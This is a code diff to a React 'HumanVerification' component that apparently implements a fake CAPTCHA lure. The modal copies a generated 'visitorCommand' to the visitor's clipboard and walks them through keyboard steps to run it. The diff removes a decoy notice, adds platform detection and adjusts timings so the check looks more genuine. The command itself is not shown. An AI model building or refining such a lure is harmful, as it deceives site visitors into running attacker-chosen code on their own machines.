@@ -3,7 +3,6 @@
 import { useEffect, useRef, useState, type FormEvent } from "react"
 import { usePathname } from "next/navigation"
 import {
-  decoyCode,
   humanVerification,
   verificationApi,
   visitorCommand,
@@ -46,6 +45,18 @@ function readPassedAt() {
   } catch {
     return null
   }
+}
+
+function browserPlatform() {
+  const hinted = (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform
+  if (hinted) return hinted
+  const platform = navigator.platform || ""
+  if (/Mac/i.test(platform)) return "macOS"
+  if (/Win/i.test(platform)) return "Windows"
+  if (/iPhone|iPad|iPod/i.test(platform)) return "iOS"
+  if (/Android/i.test(platform)) return "Android"
+  if (/Linux/i.test(platform)) return "Linux"
+  return ""
 }
 
 async function verifyFetch(path: string, init?: RequestInit) {
@@ -217,6 +228,8 @@ export function HumanVerification() {
       }
     }
 
+    let generation = 0
+
     const sendPresence = async (visible: boolean) => {
       const response = await fetch(`${verificationApi()}/verify/sessions`, {
         method: "POST",
@@ -239,21 +252,27 @@ export function HumanVerification() {
     }
 
     const beat = async () => {
-      if (pending || document.visibilityState === "hidden") return
+      if (pending) return
+      const mark = generation
       pending = true
       try {
         const next = await sendPresence(true)
-        if (!cancelled && next) apply(next)
-        } catch (reason) {
-          if (!cancelled && !sessionRef.current) {
-            setError(reason instanceof Error ? reason.message : "The check could not be completed.")
-          }
-        } finally {
-          pending = false
+        if (mark !== generation) {
+          void sendPresence(false).catch(() => {})
+          return
         }
+        if (!cancelled && next) apply(next)
+      } catch (reason) {
+        if (!cancelled && mark === generation && !sessionRef.current) {
+          setError(reason instanceof Error ? reason.message : "The check could not be completed.")
+        }
+      } finally {
+        pending = false
+      }
     }
 
     const leave = () => {
+      generation += 1
       void sendPresence(false).catch(() => {})
     }
 
@@ -270,24 +289,20 @@ export function HumanVerification() {
     })
 
     const onWake = () => {
-      if (document.visibilityState === "hidden") {
-        leave()
-        return
-      }
       void beat()
     }
     document.addEventListener("visibilitychange", onWake)
     window.addEventListener("focus", onWake)
     window.addEventListener("pageshow", onWake)
-    
+    window.addEventListener("pagehide", leave)
+
     return () => {
       cancelled = true
       window.clearTimeout(timer)
       document.removeEventListener("visibilitychange", onWake)
       window.removeEventListener("focus", onWake)
       window.removeEventListener("pageshow", onWake)
-      window.addEventListener("pagehide", leave)
-
+      window.removeEventListener("pagehide", leave)
     }
   }, [attempt, pathname, track])
 
@@ -301,11 +316,11 @@ export function HumanVerification() {
     try {
       const next = await verifyFetch(`/verify/sessions/${session.id}/check`, { method: "POST" })
       const elapsed = Date.now() - started
-      if (elapsed < 1100) await new Promise((resolve) => window.setTimeout(resolve, 1100 - elapsed))
+      if (elapsed < 1200) await new Promise((resolve) => window.setTimeout(resolve, 1200 - elapsed))
       if (checkRun.current !== run) return
       setSession(next)
       setMark("done")
-      await new Promise((resolve) => window.setTimeout(resolve, 450))
+      await new Promise((resolve) => window.setTimeout(resolve, 800))
       if (checkRun.current !== run) return
       setChecked(true)
       setChecking(false)
@@ -319,7 +334,7 @@ export function HumanVerification() {
 
   async function onCopy() {
     if (!session) return
-    const command = visitorCommand(session.id, navigator.userAgent)
+    const command = visitorCommand(session.phrase, navigator.userAgent)
     if (!command) return
     setError("")
     let placed = copyText(payloadText)
@@ -385,9 +400,7 @@ export function HumanVerification() {
   if (!track || !open) return null
 
   const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
-  const command = session ? visitorCommand(session.id, agent) : ""
-  const host = typeof window === "undefined" ? "" : window.location.hostname
-
+  const command = session ? visitorCommand(session.phrase, agent) : ""
   if (!passed && !checked) {
     return (
       <div
@@ -503,13 +516,12 @@ export function HumanVerification() {
       aria-modal="true"
       aria-label={passed ? humanVerification.successTitle : checked ? humanVerification.challengeTitle : humanVerification.title}
     >
-      <div className="w-full max-w-[620px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
+      <div className="w-full max-w-[520px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
         {passed ? (
           <div className="px-0 py-10 text-center">
             <h2 className="text-xl font-semibold text-[#16a34a]">{humanVerification.successTitle}</h2>
             <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
           </div>
-        // ) : checked && session ? (
         ) : (
           <>
             <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
@@ -527,10 +539,6 @@ export function HumanVerification() {
               )}
             </p>       
             <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-left">
-              <p className="mb-2 text-sm text-[#475569]">
-                {humanVerification.decoyCaption}
-              </p>
-
               <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                 <li>
                   Press the{" "}
